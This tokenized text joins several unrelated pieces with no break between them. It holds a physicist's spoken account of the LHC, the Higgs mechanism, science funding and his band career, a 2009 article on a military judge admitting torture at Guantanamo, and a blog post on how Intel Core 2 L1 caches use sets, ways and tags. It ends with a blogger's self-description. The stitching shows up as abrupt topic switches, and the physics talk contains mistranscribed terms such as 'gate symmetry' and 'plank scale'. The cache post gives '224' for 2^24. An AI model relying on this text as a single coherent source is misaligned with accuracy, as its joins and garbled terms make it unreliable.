That 's a door , the door on the main road of physics , which we 'll open when we discover it .
And it should take three to four years , if the LHC performs as we like .
As you may know , we had some issues , which blew a little bit of it up after commissioning it .
Without the schedule of the moment , as I speak in February of 2009 , is that all the refurbished magnets — we damaged about 50 of them — will be back in the LHC in the end of March .
The LHC will be commissioned in September and begin to take physics results in October , and run for a year , which is unusual for CERN , which really takes days for over the winter , but we 're going to run for a year .
So it 's pretty much caught up to where we should have been anyway by autumn 2010 .
It 's an exciting time .
It 's actually the first time certainly in my career , and probably for 20 , even 30 , years that you could guarantee that you have a particle accelerator that has enough energy to discover something profound , which in this case is the origin of mass in the universe — maybe Higgs , maybe something else .
My most cited paper is called " WW scattering in the absence of a light Higgs , " so those are my cards on the table .
If you decide not to allow , or you request that politicians do not direct the direction of scientific research , then the question arises , well , who does it ?
Somebody has to allocate the billions of dollars of public money that are spent on scientific research every year .
Scientists are good and bad at doing this .
Scientists are very bad when pressure is applied to them , because scientists are clever , and scientists are good at playing systems .
If you put a system in place then the scientists will go and get the money , and there 's a huge danger of scientists trying to second guess government , and you get into a vicious circle .
Let 's say governments want particle physicists to have an eye on the big questions of the day — for instance , energy security .
There 's some overlap between particularly fusion research , big science projects that require big magnets that are similar in many ways to the magnets we use at the LHC .
What you can see is that a scientist in a university whose salary — particularly in the US , but also in the UK — and professional standing is based on the amount of research income they get , will build research projects they think governments , or at least the funding agencies , will respond to .
The direction can often be accidental .
This is a snowball effect , and I 've seen it in effect in the UK .
Obviously a politician such as a science minister will say that the government has priorities and does n't really think about the impact that will have further down the food chain .
But for some reason people listen to politicians really carefully and they pick out the little nuances as they see them and then start modifying their behavior .
Before you know it you have an intensely directed , narrowing , science program , which nobody really intended to generate .
What you need actually at the top of science are people who are not in awe or overwhelmed by the political process and also who do n't enjoy it , actually , because it 's really quite enjoyable to start mixing with the powerful and trying to understand ... I 've seen it .
You can get it into a mind set where you think , I know what these guys in Washington or London are thinking .
And you start maneuvering .
And you ruin the science program .
You need people who believe that scientific investigation is of most benefit to society when it's free and who do n't believe that politicians are the people who can maximize the benefit to society through the direction of science funding .
There are 10,000 physicists and engineers at CERN , and many of them are not there permanently .
The population in Geneva fluctuates .
There are 85 countries around the world , and physicists from all of those institutes collaborate either on the data or in building the hardware .
It is a wonderful place , because its commitment to blue skies research research , is absolute , and there can be no better symbol of that pure curiosity - driven research than the Large Hadron Collider .
It has no use in terms of commerce .
It 's value is in furthering our understanding of the universe .
If you want to defend the Large Hadron Collider , then the best defense is that it 's never been a bad idea to understand the way the universe works .
Right ?
History tells us that .
CERN itself is very free , and its constitution is free .
It came out of the Second World War .
It was an international institution built to participate in the cultural regeneration of Europe .
I believe first conference that was mentioned might have been 1949 in Lausanne , but it was officially founded in 1954 , officially .
The constitution says blue skies research for the peaceful pursuit of knowledge I think is in the constitution of CERN .
It 's a wonderful place .
But then at the national level it changes a little bit , because the particle physics ' budgets become subject to the political kind of manueverings of the day in particular countries .
Again , CERN has a huge advantage because it 's protected by international treaty certainly amongst the 20 European member states .
There is kind of a story , it may be apocryphal , but in the ' 80s Margaret Thatcher 's government in Britain was very aggressively looking at all government spending and looked at pulling out of CERN .
But the UK contribution to CERN today is 80 million pounds a year , and that 's an international treaty , and it is far too much hassle to pull out of an international treaty for a government , because the cost / benefit ratio of causing the trouble just seems to be too much .
That 's the story that you hear .
It 's actually a very small budget if you think about it .
It 's about the budget of a medium - sized Western university .
It 's less than a billion dollars a year in total .
Once you arrive at CERN and you 're part of one of the big experimental collaborations — there are four of them , ATLAS , CMS , LHCB and ALICE — around the LHC .
The work that you do within that is divided into two bits .
All universities play some role in maintaining the hardware .
There is a serious bit of science and engineering to do , so the bits of hardware , the bits of the receptors are built in the universities around the world , and that 's your responsibility .
You have an organization to do that , and that 's the kind of serious day - to - day bit .
The other bit is when the data comes , which is what everybody is in it for .
Then you have complete freedom to do what you want with that data ; anybody from the collaboration can look for anything .
Actually one of the great challenges for people who manage the top of these collaborations is to try and make sure that not everybody goes and looks for the Higgs particle , for example , because there 's a ton of physics to do .
You can only use coercion to do that .
We 've never collided particles together at these energies before , so it 's an interesting management challenge because you want to cover the whole of the physics and the whole of the physics you can do .
It does get covered because there are different characters in experimental physicists .
Some of them like to work on the big questions , which by definition require a big team .
If you 're looking for the Higgs , there 's a huge working group at ATLAS — let 's say there are hundreds of physicists from 10 , 20 institutions all working together to do it .
Or you can go into a little corner , a kind of more esoteric branch of particle physics , where you might be working on your own with a couple of grad students at your university .
Fortunately , because there are lots of different characters , it seems to balance out quite nicely , and there are enough people to do everything .
I personally like to drift off into slightly more esoteric corners .
I like to work a little bit on my own , or in a small group .
I do two things .
One is I lead an upgrade project — a hardware update project — and the aim is to put these little detectors half a kilometer away from the point where the protons collide at the LHC .
This is to take advantage of an interesting process called central exclusive production .
Basically the protons come in and they can glance off of each other and they can stay intact .
You get : two protons in , two protons out , lose a bit of energy .
All of the energy they lose can go into the production of a single object , which you 'll see in the main detector .
So that could be a Higgs particle .
You get PP , it goes to PP Higgs , because these protons lose a bit of energy when they go around the corner in the LHC , so we go through the magnets .
They get bent a little bit more because they go in a little bit slower into the magnetic field .
They get bent out of the beam .
And at half a kilometer away , if you can get little detectors in to about five millimeters from the LHC beam , which has the energy of an aircraft carrier going at 30 miles an hour , by the way , so you have to be careful , you can grab these .
You can detect them .
And when you think about it , if you can just detect both of them then you can measure exactly how much energy got lost , because you know where they are and how far they came out of the beam .
So you can measure the mass of the thing beautifully accurately to really high precision .
It might have been a neutral thing .
Iit turns out that in this process , if you see a Higgs particle you immediately know what its properties are .
There are other properties as well that you can infer from this process .
It 's one of the only ways anyone has been able to think of LHC for measuring the properties of the Higgs .
You can detect it and you can see what its mass is and you can discover it , but you 've also got to measure what it is to show that it is a Higgs .
Or it might be some other kind of thing .
This was a process that really myself and a few colleagues in theoretical physics worked on about eight years ago .
When we built the LHC and designed it , we did n't know really about this process .
You asked the question , could we add them in , these little detectors , as an addition , and use this process ?
That 's going quite well , actually , on two of the big experiments — ATLAS and CMS .
That 's through the R&D phase and into the kind of final development phase .
That ’s my hardware thing and that was kind of my idea — I actually lead that on both collaborations .
Then the more standard physics I 'm very interested in — that 's Higgs .
I 'm very interested in what happens if there is n't a Higgs .
Because the great thing about the LHC is that it has enough energy to discover the mass generation mechanism , whatever it is .
We know exactly at what energy our theory , the standard model , the particle physics , breaks down and does n't work without a mass generation mechanism .
It 's 1.4 TeV in particle physics units , the LHC has 14 TeV .
It has plenty of energy to go to that point and it breaks down in a very specific place , which is there are particles called W - particles , and they carry a force called the weak nuclear force .
That is the force that allows protons to turn into neutrons in the sun .
The sun works by taking four protons , four hydrogen nuclei , and making a helium nucleus , which is two protons and two neutrons .
The sun has to turn protons into neutrons .
And the W - particles , the weak force , does that .
It 's fundamental to the universe , but quite esoteric in that we do n't notice it here on earth very much unless we look at the sun .
So we do .
We do n't know we 're noticing it .
Those things , those W - particles , are very heavy .
They 're 80 times as heavy as a proton , so as heavy as a nucleus of gold , or something like copper , let 's say , something like that .
That is the piece of the standard model that really requires the Higgs .
The matter particles are not too problematic with giving masses to them .
We think that goes to the Higgs mechanism as well , but it does n't matter as much .
It really matters for the force - carrying particles .
Having massive force - carrying particles is a nightmare for the mathematics and the beauty of the theory .
It turns out that when you collide those things together , which you can do at LHC , you can have some protons going along , and they can emit W - particles and they can bounce off each other .
It turns out that that 's the most sensitive place to look for the origin of mass , indeed whether there 's a Higgs there or not .
It 's the process that you want to look at .
I 've done a lot of work on looking at what happens if you make no assumptions and you look for WW bouncing off each other in the detectors at LHC and just measure it without prejudice , without any assumptions at all — make a measurement and look , because then you do n't bias the results at all .
It 's an interesting process .
Most models , even models that have extra dimensions in the universe , which can explain mass generation — whatever you want — you can see it in that process .
I could give you a more technical answer for the connoisseurs if you want , but that 's a beautiful process .
If there 's no Higgs then the mass generation mechanism over there — there 's a good analogy because way back before we understood the strong force ( that 's before we know of things like quarks that build up protons and neutrons ) , there 's a process called pion pion scattering .
Pions are little particles like a proton with quarks in them , but we did n't know that .
But we knew about the pions .
And you can bounce them off each other .
Actually , although historically this is n't the way it happened , you could have put a Higgs mechanism into that process .
It ’s in many ways identical to the WW scattering process , and so you could have put Higgs mechanism in .
You could have done the calculations and you would have got the right answer pretty much for the way that they bounce off each other .
But you would have been wrong .
What actually controls that scattering process is the underlying substructure of the pions — the fact that they 've got quarks in them — and you end up with the QCD , quantum chrome dynamics , the theory of the strong force .
What actually happens is you bounce them together and make something called a rho particle , which then decays back into pions again .
You have pi , pi , rho , pi , pi .
The W - particles could be exactly the same as that .
They could have substructure essentially as well .
As they call technicolor , which is literally that .
It could be that the history repeats itself , and what you do actually is you incorporate another layer of the onion , as it were .
See , the Higgs is basically the assumption that there 's no new physics until the point where gravity becomes important .
If you have a Higgs - type theory it can survive all the way out to what we call the plank scale .
So that 's really an astatic choice in many ways .
It does n't have to , but it can .
A Higgs - type mechanism is attractive to some physicists because it can survive .
It can be the only thing you need .
But of course there are many other theories .
There are many other things you can discover , LHC , there are things called super symmetry , which doubles the number of particles , and that has five Higgs Bosons in the most basic version rather than one .
There are lots of different Higgs mechanisms , so you can have Higgs - type mechanisms , and it is true to say there 's indirect evidence for that .
People do n't just kind of like it because it sounds cool .
There are measurements that have been made that are suggestive that that might be the right track .
But you could have something completely different .
That 's the point .
The problem of mass in physics , which sounds like a strange problem to have , occurred right at the birth of the standard model , which is the Newton 's laws of particle physics .
But there 's a property of the standard model called a gate symmetry , which is a fancy word for a really simple idea .
Basically let 's take a particle like an electron .
In quantum mechanics , an electron is described not as a point - like thing but by a field .
You can really kind of almost think of a field with hills and valleys .
If we put an electron in this room now , quantum mechanically it will fill the room .
There will be an electron field which goes right to all the walls , and where it 's got a big value , like a hill , then it 's more likely to be , and where it 's got a small value , like a valley , it 's least likely to be .
Of course if you put an electron in the middle of the room it will be very highly peaked where you would classically expect the particle to be , but it decays out like that .
And what you find , and it was known back in the '30s in the origin of quantum mechanics is that these fields have an extra little bit of freedom in them — an extra little property — and it 's called a phase .
You can think of it literally like a clock hand , a little clock face .
At every point you have a value for the field , and you have this little clock face .
What was known right at the start is that you had a freedom in that you could put these clock hands any way you wanted , but you had to move them all at once .
It ’s called a global gauge in variance .
The equations of physics do n't change if you 're allowed to move them all in parallel like that , right ?
But it was also asked , well , given that this seems like an arbitrary bit of freedom , what happens if you 're allowed to move them all separately ?
That would be called a local in variance , and it was known that the equations changed .
So you were n't given that freedom .
But physicists persisted , Yang and Mills particularly , the first two physicists who tried this , say , well , can you fix the equations up , right ?
So we 're allowed this freedom to move them all differently .
It turns out that you can and magically what happens — so you start off with a theory of non-interacting electrons , there are two electrons there , and you do n't have any force between them at all .
Then you demand that you can move all of these things around like that in different places , and what you have to add in is precisely the mathematics of the interaction , the mathematics in this case of the electromagnetic force .
The form , the electromagnetic force , the photon , the carrier of electromagnetic force , comes into the theory when you try and fix it up so you can move all these little clock hands around .
The same turns out to be true in a more abstract higher dimensional clock hand thing for the weak force and the strong force , so three of the four forces of nature , excepting gravity , are what 's called common , because of the demands of this gauge in variance , local gauge in variance .
It ’s very profound .
It 's a very attractive idea , because the forces of nature in this picture are essentially a consequence of demanding that you can move the little clock hands around everywhere in the quantum fields .
Fantastic .
That works , except it does n't work if you introduce mass into the standard model .
It breaks it again .
So you 're in a position where you have this beautiful thing , which gives you the form of the forces , but it only works if everything is massless , and particularly the little force - carrying particles that you introduced by this process , you get mass , then you encounter a particular problem .
The W and the Zed particles , which carry the weak force , have a huge mass , experimentally .
We discovered them in the ' 80s .
They 're there .
We know how much they weigh ( Inaudible ) how much mass they have .
So what you have to do is say , well , can we fix it again ?
It turns out you can .
You can fix it again by introducing the Higgs mechanism .
The Higgs mechanism works by filling the universe with another field called the Higgs field , so the picture is everywhere in this room , everywhere and inside our bodies and everything , this Higgs field permeates the universe .
The way that particles get mass is they interact with this field , so as they move through the universe , things that have mass talk to the Higgs field , interact with the Higgs field .
Literally you could imagine they 're interacting with Higgs particles all over the place .
Things that do n't have a mass , like a photon , do n't interact with the Higgs field , and travel through the universe at the speed of light .
That 's how the Higgs mechanism works .
You can kind of say , in a hand - wavy fashion , that that dodges the problem , because in some sense things remain massless , and they get their mass by an interaction with a field .
It 's just like pulling something through maple syrup , in a way .
If you get a little light thing and pull it through maple syrup , then it feels heavier because there 's resistance .
It ’s kind of like that .
And magically that allows the gauge and variance stuff to work , and you can almost see why , because in some sense the things do n't have mass .
You did n't put it in by hand ; you generated it .
That 's why it 's light ; because it protects your beautiful mathematics again and allows this whole structure to work .
It ’s an integral part of the standard model of particle physics , the Higgs , now the so - called standard model Higgs .
It 's in there .
If you take it out and try and predict things , particular things at the LHC , then it predicts nonsense , so whatever does the job you have to find .
~~
I 'm absolutely an experimental physicist in every way .
I believe that science is simple , basically .
What you do is you look at the universe and you try to find out how it works and you address specific problems .
Science is best when it works like that .
There are two kinds of scientists .
There are theorists who theorize , and they give you the kind of landscape of possibilities .
They might miss what nature has chosen , but they tend not to , because there are lots of them working on different things .
For example , there ’s Lisa Randall , who thinks that many of the problems of particle physics could be solved by infusing extra dimensions into the universe .
Or you have Leonard Susskind , who thinks that string theory may be the answer , or Brian Green , or you consider the more mainstream physicist , Frank Wilczek — these are the physicists who are involved intimately in developing the standard model , and they would look at Higgs light mechanisms , or super symmetry , which is probably the most mainstream extension to the standard model .
It provides a candidate for dark matter in the universe , for example .
Philosophically I feel it was wrong to offer an opinion .
People can ask what 's the most likely thing that will happen at the LHC , and I want to say that my view of science is that that would be almost an unscientific question .
I would like to be the person who looks at nature without prejudice .
That 's impossible to do , though , because the most efficient way to find new physics at LHC is almost certainly to look at models , to look at what they predict and go and look for those signatures , because otherwise it 's very difficult .
If you just have a load of data and you have no idea what you 're looking for at all , it will take you a very long time to find it in general .
The Higgs , let 's say , which is a big , mainstream , well - understood prediction , we know how the Higgs behaves in that theory , and it decays into particular particles .
There are very well - known signatures and so the most efficient way to find it if it exists is to go and look for those signatures .
It would be wrong to get too puritanical about the method of doing experimental science , but I find it very difficult to try and weigh the chances of the different theories being right or wrong .
Some of it 's sociological .
There ’s a tendency toward " guruification " — is that a word ?
— in physics .
Some charismatic theorists — and there are many of them — who seem to have followers .
That does n't matter .
It sounds terrible , but it does n't matter , because actually science works by measuring the correctness or otherwise of ideas against nature , so it does n't matter if you have gurus around , as long as they do n't take everyone with them .
If you took every grad student in the world and made them all work on super symmetry because you were the most charismatic — you were the Ghandi of particle physics — then it would be a bad thing , but that does n't happen .
Some of the criticism of string theory centers around that phenomenon .
You hear some people getting upset because they think the brightest people have followed string theorists who in some sense would probably consider themselves to be gurus .
You can see some tensions , but in general there are enough theories to go around .
You 're tempted to say there are going to be a lot of unhappy theorists , but pretty much every theorist that I 've met is a proper scientist .
The mark of a scientist is that they 're not attached to their ideas .
They 're attached to the truth .
I use that word quite lightly , as well , because philosophically I would find it difficult to say that anything we know about the universe is correct in some sense — a truth would be the wrong word .
What it is is the best description we have , and we know that every description we have of nature is not complete .
We know that .
We know how gravity is not understood .
We know that the standard model is incomplete , at least you need something like the Higgs .
Even then there are problems that rear their heads , that Higgs does n't explain everything by a long way .
Leon Lederman coined the term " the God particle , " although you hear rumors that actually it was his publisher or perhaps his agent to sell some books because " the God particle " implies that it 's an answer to everything .
You hear that a lot .
I get questions at public talks , what are you going to do when you find the Higgs ?
They always say " when . "
What are you going to do when you find the Higgs ?
Is that the end of physics ?
And it is n't .
It causes immense problems actually , the standard model Higgs particle .
The Higgs is what 's called a scalar particle , the particular properties that it has .
There are no fundamental scalar particles in nature at the moment in this particle physics sense .
It causes a lot of grief actually .
Some people do n't like it for that reason , but we 'll find out .
Where you go next in particle physics honestly depends on what you find at CERN .
I 'm actually not of the opinion that you just continue to build bigger and bigger machines unless you have specific questions to answer , because I see particle physics as part of the main line of physics .
At the moment we need machines of that energy to make progress , so you build one .
Then what you do next depends what you find .
If you find a Higgs , then that starts a whole research program of trying to measure its properties , because its properties are not entirely specified in any sense by the theory .
You probably need something like a Higgs factory .
You need a very clean machine .
A linear collider would be an example .
A straight - line electron collider or it would be electron - electron to just tune to the right everything to make Higgs particles .
You make lots of them in a clean environment and you can measure them precisely .
The same with super symmetry .
If you discover this doubling of the particles of nature with the dark matter candidates there , then you probably need a linear collider to tease it out .
But if you describe extra dimensions in the universe , then it may be that a clean machine to make things is not the way to go when you might upgrade the LHC .
In a very pure sense you build the accelerator you need when you know what the question is .
If you do n't have a question , you do n't build one , because they 're expensive .
There is a technical issue with that , which is that the lead time is so long for these machines that you can't really wait until — if you strongly suspect you 're going to need another one , you need to be doing the R&D , not only because of the lead time , but the people who build them , the accelerator builders .
These machines are incredibly difficult to build and they require experience and they require an engineering community that passes the knowledge from one generation to the next .
If you have a 20 - or 30 - year lead time on these machines you find that the people who know how to do it retire , and if you 're not passing that knowledge on then you can't build another one , very simply .
You hear that the US has had that problem with rocket technology .
It 's very difficult to build a Saturn V now if you wanted to because the people who knew how to do it have gone and not passed the knowledge on .
I do n't know whether that 's true , but you hear that .
In particle physics this is a problem , and it's the same with any big scientific engineering endeavor .
The same problem is there with fusion reactors , which is a very serious problem for the world .
We need to have rather more fusion reactors in development than we have at the moment for that reason .
~~
I have an unusual background and my path into science was unusual in that I always wanted to be a physicist of some kind .
I did n't know what the word was when I was four or five years old .
I wanted to be an astronomer .
I grew up in a house that watched the moon landings .
I watched the moon landing .
I was one , but I watched it .
My first Christmas eve was Apollo 8 coming around the back of the moon and taking the picture of earth 's rise , which was always in the house .
So I knew that I wanted to do something that involved that .
Science and exploration to me have always been intertwined together .
They are really one and the same thing .
Throughout my childhood , that was it .
I could n't tell the difference between " Star Wars " and NASA .
Whatever it was , it was something to do with space , astronomy , then that was it , to the point where when I was 11 you go to high school in the UK , and I essentially refused to do French because I thought that it was n't physics , and I actually failed French , the French exam , and then ended up working in Geneva .
So there 's a lesson — I started at CERN actually about five or six years ago .
At the age of 14 or 15 , I was going to be a physicist , astronomer , whatever , something .
Then I started going to musical gigs , and the one that sticks out in my mind , perhaps somewhat embarrassingly , is that I went to see a Duran Duran gig with my sister in Leeds , which is close to Manchester , where I lived .
And I thought , I want to do that — that 's great .
So I learned to play keyboards — I did n't play an instrument before then — and then at the age of 18 , a guy from the band Thin Lizzie moved in down the road from me .
Thin Lizzie had just split up , and he said he wanted to form a band .
I said , I 'll do that ; that would be cool .
I joined a band with him instead of going to university , got a deal with A&M Records , made two albums , both in L.A. , actually , with A&M — one at Joni Mitchell 's house , which was really fantastic .
Joni Mitchell 's husband at the time , Larry Klein , produced it .
He 's a great bass player .
That was in ‘ 87 , ‘ 88 .
I did that for five years , had a fight in a bar in Berlin and split the band up on tour , like Spinal Tap , in ' 92 .
And that was the end of the band .
I came back and the day after applied to Manchester University and said , I want to do physics now — I 'll just carry on doing what I was going to do anyway .
So I started doing physics .
I accidentally joined another band called D: Ream , who then had a number one hit in Britain and a song called " Things Can Only Get Better , " which was used by Tony Blair to get elected in ' 97 and we reformed the band in ' 97 to do gigs with Blair , which was great fun .
As a result , the BBC years ago decided — because I 'd been on a show called " Top of the Pops " in Britain several times — that I would be able to present science , because it 's the same .
That was the beginning of my parallel career of making two BBC programs .
US tortured Guantanamo prisoners , Army judge admits
By Patrick Martin
15 January 2009
In an extraordinary public declaration , the top military judge overseeing the military tribunals at Guantanamo Bay admitted two of the principal charges long made against the Bush administration — that prisoners at the Guantanamo Bay detention camp have been tortured , and that the torture was carried out in accordance with an official policy set in Washington .
In an interview with Washington Post reporter Bob Woodward , Susan Crawford said that prisoner Mohammed al - Qahtani had been so systematically abused through isolation , sleep deprivation , forced nudity and exposure to cold that he was in a " life - threatening condition . "
" We tortured Qahtani , " she told Woodward .
" His treatment met the legal definition of torture .
And that 's why I did not refer the case " for prosecution .
A 61 - year - old former Army counsel and former Pentagon inspector general , Crawford served from 1991 to 2006 as a judge of the United States Court of Appeals for the Armed Forces .
In February 2007 , Defense Secretary Robert Gates named her the convening authority of the military commissions .
In May 2008 she dismissed war crimes charges against Qahtani , without giving her reasons publicly .
While saying that she did not know any specifics of the treatment of the five other Guantanamo prisoners accused of 9/11 offenses , Crawford said , " I assume torture , " noting that Bush administration officials have admitted that several of the prisoners , including alleged 9/11 organizer Khalid Sheik Mohammed , had been waterboarded .
Crawford made clear that the abuse of prisoners was not the result of lower - ranking interrogators being overzealous , but the consequence of policies set at the top .
The techniques used against Qahtani were approved by then - Defense Secretary Donald Rumsfeld .
" A lot of this happened on his watch , " she said .
The responsibility , she suggested , goes even higher , to the Bush White House .
" I think the buck stops in the Oval Office , " Crawford told the Post .
" I think he hurt his own effort , " she added , referring to Bush 's establishment of the system of military tribunals .
" I think someone should acknowledge that mistakes were made and that they hurt the effort and take responsibility for it . "
A Saudi national , Qahtani was refused entrance to the United States at the airport in Orlando , Florida in August 2001 .
Bush administration officials have described him as the " 20th hijacker , " an Al Qaeda militant who was seeking to join the 19 other men , mostly Saudis , who took part in the September 11 attacks .
He was subsequently picked up by US forces in Afghanistan and shipped to Guantanamo in January 2002 , where he attracted little initial attention — inexplicably , given his supposed role in 9/11 .
His interrogation began in November 2002 and continued for three months , followed by another three months of solitary confinement .
The grisly nature of his treatment at Guantanamo has been previously reported in the American press , based on statements from defense attorneys and others familiar with the case .
But no high - level official — let alone the presiding judicial authority — has confirmed the details and categorically declared his treatment to be torture .
" The techniques they used were all authorized , but the manner in which they applied them was overly aggressive and too persistent , " she told the Post .
" You think of torture , you think of some horrendous physical act done to an individual .
This was not any one particular act ; this was just a combination of things that had a medical impact on him , that hurt his health .
It was abusive and uncalled for .
And coercive .
Clearly coercive .
It was that medical impact that pushed me over the edge " to call it torture .
Qahtani was repeatedly strip - searched , frequently with female agents involved , forced to wear women 's underclothes and a dog leash while chained and being interrogated , threatened with assault by military dogs , and compelled to perform a series of dog tricks .
He suffered long periods of sleep deprivation , including " 48 of 54 consecutive days of 18 - to - 20 - hour interrogations , " according to one document .
The suffering was so intense that Qahtani was hospitalized twice with bradycardia , a severe lowering of the heart rate which can be fatal .
At one point his heart rate was only 35 beats per minute .
According to his attorney , Qahtani suffers from loss of memory and ability to focus , as well as paranoia .
Still imprisoned at Guantanamo , he maintains his innocence and denies any connection to Al Qaeda .
Crawford , a Republican and career military jurist , expressing sentiments now widespread in the Pentagon , voiced her concern that the torture of prisoners at Guantanamo Bay has been a public relations disaster for the US government , as well as endangering US military personnel who may be captured in the future .
" I sympathize with the intelligence gatherers in those days after 9/11 , not knowing what was coming next and trying to gain information to keep us safe , " she told the Post .
" But there still has to be a line that we should not cross .
And unfortunately what this has done , I think , has tainted everything going forward . "
The treatment of Qahtani " did shock me , " she said .
" I was upset by it .
I was embarrassed by it .
If we tolerate this and allow it , then how can we object when our servicemen and women , or others in foreign service , are captured and subjected to the same techniques ?
How can we complain ?
Where is our moral authority to complain ?
Well , we may have lost it . "
Crawford 's interview with the Post coincided with another major legal blow against the kangaroo courts at Guantanamo Bay .
A former Guantanamo prosecutor , Darrel Vandeveld , filed a declaration with a US appeals court Tuesday supporting the release of Mohammed Jawad , an Afghan youth seized by US troops in 2002 and held in Guantanamo for the past six years .
Vandeveld , a former lieutenant colonel in the Army Reserve responsible for the cases against seven prisoners facing military tribunal , resigned his position last September citing the abuse of Jawad by Afghan police and the US military and the use of evidence he said was suspect , false or outright fabricated , including a confession signed by Jawad in a language , Farsi , that he does not speak .
Jawad is one of two prisoners facing trial at Guantanamo Bay who were 17 years old or younger when captured by US forces .
The Bush administration is prosecuting both Jawad and Canadian citizen Omar Khadr as adults , although international agreements require that both be classified as " child soldiers " and treated as victims of the conflict .
The American Civil Liberties Union , Amnesty International , the Coalition to Stop the Use of Child Soldiers , Human Rights First and Human Rights Watch issued an appeal Monday to President - elect Barack Obama to halt proceedings against Jawad .
This appeal came one day after an ABC television interview in which Obama backed off from his election campaign pledge to close the Guantanamo Bay detention camp as soon as he takes office , and distanced himself from suggestions that top Bush administration officials should face prosecution for authorizing torture , illegal wiretapping and other attacks on democratic rights .
Meanwhile , the Times of London reported that nearly one fifth of the prisoners at Guantanamo Bay have gone on hunger strike and are being force - fed by the military authorities .
According to the newspaper , of the 248 inmates of the facility , 44 are refusing food and 33 are suffering the brutal reprisal of liquid being forced up their noses through tubes and into their stomachs .
One attorney for several prisoners said the actual total of hunger strikers was over 70 , nearly one third of those still held .
Over the past seven years , the Bush administration has incarcerated more than 700 men at Guantanamo , portraying them as , in Rumsfeld 's words , " the worst of the worst . "
Of these , nearly 500 have been repatriated and released without charges — and without any compensation for the loss of years of their lives to brutality and false imprisonment .
The testimony of Susan Crawford , Darrel Vandeveld and other military and civilian officials who have spoken out on the crimes taking place at Guantanamo or their cover - up would be of critical importance in bringing the top officials of the Bush administration to justice .
All the officials responsible for the Guantanamo Bay atrocities should face an international tribunal for their crimes — as well as the other acts of torture , illegal detention , kidnapping and murder committed by US agencies in the course of the " war on terror . "
This should include Bush himself , Vice President Cheney , Rumsfeld , Condoleezza Rice and the high - ranking CIA and military officers who implemented the torture policy , as well as executive branch lawyers who wrote the legal apologetics for these gross violations of international law .
Obama 's statement that he wants to " look forward rather than back " amounts to declaring a political amnesty for all the crimes committed by the Bush administration .
Obama and the congressional Democrats are adamantly opposed to any serious investigation into these crimes because such an effort would expose the complicity of the Democrats themselves — as well as cut across the program of state violence and repression that the Obama administration intends to carry out in Afghanistan , Iraq and other countries targeted by American imperialism .
This post shows briefly how CPU caches are organized in modern Intel processors .
Cache discussions often lack concrete examples , obfuscating the simple concepts involved .
Or maybe my pretty little head is slow .
At any rate , here 's half the story on how a Core 2 L1 cache is accessed :
The unit of data in the cache is the line , which is just a contiguous chunk of bytes in memory .
This cache uses 64 - byte lines .
The lines are stored in cache banks or ways , and each way has a dedicated directory to store its housekeeping information .
You can imagine each way and its directory as columns in a spreadsheet , in which case the rows are the sets .
Then each cell in the way column contains a cache line , tracked by the corresponding cell in the directory .
This particular cache has 64 sets and 8 ways , hence 512 cells to store cache lines , which adds up to 32 KB of space .
In this cache 's view of the world , physical memory is divided into 4KB physical pages .
Each page has 4KB / 64 bytes == 64 cache lines in it .
When you look at a 4KB page , bytes 0 through 63 within that page are in the first cache line , bytes 64 - 127 in the second cache line , and so on .
The pattern repeats for each page , so the 3rd line in page 0 is different than the 3rd line in page 1 .
In a fully associative cache any line in memory can be stored in any of the cache cells .
This makes storage flexible , but it becomes expensive to search for cells when accessing them .
Since the L1 and L2 caches operate under tight constraints of power consumption , physical space , and speed , a fully associative cache is not a good trade off in most scenarios .
Instead , this cache is set associative , which means that a given line in memory can only be stored in one specific set ( or row ) shown above .
So the first line of any physical page ( bytes 0 - 63 within a page ) must be stored in row 0 , the second line in row 1 , etc .
Each row has 8 cells available to store the cache lines it is associated with , making this an 8 - way associative set .
When looking at a memory address , bits 11 - 6 determine the line number within the 4KB page and therefore the set to be used .
For example , physical address 0x800010a0 has 000010 in those bits so it must be stored in set 2 .
But we still have the problem of finding which cell in the row holds the data , if any .
That 's where the directory comes in .
Each cached line is tagged by its corresponding directory cell ; the tag is simply the number for the page where the line came from .
The processor can address 64GB of physical RAM , so there are 64GB / 4KB == 224 of these pages and thus we need 24 bits for our tag .
Our example physical address 0x800010a0 corresponds to page number 524,289 .
Here 's the second half of the story :
Since we only need to look in one set of 8 ways , the tag matching is very fast ; in fact , electrically all tags are compared simultaneously , which I tried to show with the arrows .
If there 's a valid cache line with a matching tag , we have a cache hit .
Otherwise , the request is forwarded to the L2 cache , and failing that to main system memory .
Intel builds large L2 caches by playing with the size and quantity of the ways , but the design is the same .
For example , you could turn this into a 64KB cache by adding 8 more ways .
Then increase the number of sets to 4096 and each way can store 256KB .
These two modifications would deliver a 4MB L2 cache .
In this scenario , you 'd need 18 bits for the tags and 12 for the set index ; the physical page size used by the cache is equal to its way size .
If a set fills up , then a cache line must be evicted before another one can be stored .
To avoid this , performance - sensitive programs try to organize their data so that memory accesses are evenly spread among cache lines .
For example , suppose a program has an array of 512 - byte objects such that some objects are 4KB apart in memory .
Fields in these objects fall into the same lines and compete for the same cache set .
If the program frequently accesses a given field ( e.g. , the vtable by calling a virtual method ) , the set will likely fill up and the cache will start trashing as lines are repeatedly evicted and later reloaded .
Our example L1 cache can only hold the vtables for 8 of these objects due to set size .
This is the cost of the set associativity trade - off : we can get cache misses due to set conflicts even when overall cache usage is not heavy .
However , due to the relative speeds in a computer , most apps do n't need to worry about this anyway .
A memory access usually starts with a linear ( virtual ) address , so the L1 cache relies on the paging unit to obtain the physical page address used for the cache tags .
By contrast , the set index comes from the least significant bits of the linear address and is used without translation ( bits 11 - 6 in our example ) .
Hence the L1 cache is physically tagged but virtually indexed , helping the CPU to parallelize lookup operations .
Because the L1 way is never bigger than an MMU page , a given physical memory location is guaranteed to be associated with the same set even with virtual indexing .
L2 caches , on the other hand , must be physically tagged and physically indexed because their way size can be bigger than MMU pages .
But then again , by the time a request gets to the L2 cache the physical address was already resolved by the L1 cache , so it works out nicely .
Finally , a directory cell also stores the state of its corresponding cached line .
A line in the L1 code cache is either Invalid or Shared ( which means valid , really ) .
In the L1 data cache and the L2 cache , a line can be in any of the 4 MESI states : Modified , Exclusive , Shared , or Invalid .
Intel caches are inclusive : the contents of the L1 cache are duplicated in the L2 cache .
These states will play a part in later posts about threading , locking , and that kind of stuff .
Next time we 'll look at the front side bus and how memory access really works .
This is going to be memory week .
Update : Dave brought up direct - mapped caches in a comment below .
They ’re basically a special case of set - associative caches that have only one way .
In the trade - off spectrum , they ’re the opposite of fully associative caches : blazing fast access , lots of conflict misses .

I post all my thoughts as coherently and cogently as I can , in as natural a context as I can .
Some of them are simple observations based on experience .
Others are philosophical thoughts of varying levels of technicality .
And still others will be socio-political comments of varying types .
I fully expect that I will step on some ideological toes .
